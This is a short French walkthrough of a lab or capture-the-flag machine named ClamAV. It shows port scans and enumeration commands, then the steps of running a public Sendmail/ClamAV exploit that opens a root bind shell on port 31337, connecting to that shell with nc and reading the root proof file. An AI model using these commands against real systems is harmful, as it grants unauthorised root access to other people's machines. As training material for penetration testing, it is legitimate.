# ClamAV

    sudo nmap -p- -sV -T5 192.168.204.42
    sudo masscan -p1-65535,U:1-65535 --rate=1000 192.168.204.42 -e tun0
    sudo /home/timothe/.local/bin/autorecon 192.168.204.42
    feroxbuster --silent -u http://192.168.204.42 -C 404
Scans classiques.

    enum4linux 192.168.204.42
    nmap  -A  -p22,25,80,139,199,445,60000 -T5 192.168.204.42
    
Scans complémentaires plus spécifiques parce que je ne savais pas par où commencer.

Le premier nous liste beaucoup d'informations (nom de domaine, noms d'utilisateurs, règles sur les mots de passe, etc.) et affirme que l'on peut se connecter en mode anonyme, mais rien ne semble directement exploitable et la connexion en anonyme ne fonctionne pas. Attention à ne pas se jeter dans les rabbit holes. Pareil pour le deuxième scan globalement, mais en parcourant les ports dans l'ordre et en cherchant des exploits liés à chaque service, on tombe rapidement sur des résultats pour Sendmail qui mentionnent aussi ClamAV. 

Celui-ci semble particulièrement intéressant : https://www.exploit-db.com/exploits/4761

D'après le code source, cet exploit ouvre le port 31337 sur la cible et nous permet de nous connecter dessus à distance directement en root, la VM est donc très simple à finir : 

    perl  ~/exploits/exploit_Sendmail_ClamAV.pl 192.168.204.42
	nc 192.168.204.42 31337
	whoami
	ls /root
	cat /root/proof.txt
